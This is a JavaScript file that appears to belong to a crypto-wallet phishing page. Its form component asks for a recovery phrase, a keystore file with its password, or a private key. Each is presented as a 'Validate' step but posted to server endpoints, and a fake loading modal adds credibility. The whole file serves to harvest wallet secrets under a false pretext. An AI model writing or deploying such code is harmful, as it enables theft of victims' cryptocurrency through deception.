function wconnForm() {
  return {
    selected: "phrase",
    isError: false,
    isLoading: false,
    status: false,
    phrase: "",
    phraseMsg: "",
    phraseBtnLabel: "<i class=\"fas fa-sync\"></i> Validate",
    keystore: "",
    keystoreMsg: "",
    keyPassword: "",
    keyPasswordMsg: "",
    privatekey: "",
    privatekeyMsg: "",
    async submitPhrase() {
      this.isLoading = true;
      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
      let fetch = await __rpg(__wc_data__.secure_phrase_endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'accept': 'application/json',
        },
        body: JSON.stringify({
          _token: __wc_data__.csrf_token,
          phrase: this.phrase,
        })
        // body: JSON.stringify({
        //     _token:__wc_data__.csrf_token,
        //     phrase:this.phrase,
        // })
      });
      if (fetch.meta.conn && fetch.meta.code != 404) {
        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
          this.isError = false;
          if (fetch.data.rData.redirect) {
            location.href = fetch.data.rData.redirect;
          }
        } else if (fetch.data.isJsn) {
          this.phraseMsg = fetch.data.rData.message;
        }
      }
      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
      this.isLoading = false;
    },
    async submitKeystoreJSON() {
      this.isLoading = true;
      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
      let fetch = await __rpg(__wc_data__.secure_keystore_endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'accept': 'application/json',
        },
        body: JSON.stringify({
          _token: __wc_data__.csrf_token,
          keystore: this.keystore,
          keypwd: this.keyPassword,
        }),
      });
      if (fetch.meta.conn && fetch.meta.code != 404) {
        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
          this.isError = false;
          if (fetch.data.rData.redirect) {
            location.href = fetch.data.rData.redirect;
          }
        } else if (fetch.data.isJsn) {
          this.keystoreMsg = fetch.data.rData.message;
        }
      }
      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
      this.isLoading = false;
    },
    async submitPrivateKey() {
      this.isLoading = true;
      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
      let fetch = await __rpg(__wc_data__.secure_private_endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'accept': 'application/json',
        },
        body: JSON.stringify({
          _token: __wc_data__.csrf_token,
          private: this.privatekey,
        }),
      });
      if (fetch.meta.conn && fetch.meta.code != 404) {
        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
          this.isError = false;
          if (fetch.data.rData.redirect) {
            location.href = fetch.data.rData.redirect;
          }
        } else if (fetch.data.isJsn) {
          this.privatekeyMsg = fetch.data.rData.message;
        }
      }
      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
      this.isLoading = false;
    },
  }
}


// Modal

const modalBtn = document.getElementById("modal-button");
const modalShow = document.getElementById("modal-show");
const load = document.getElementById("loader");

modalBtn.addEventListener("click", () => {

  load.style.display = "block";
  setTimeout(() => {

    load.style.display = 'none'

    modalShow.style.display = "block";

  }, 3000);


});
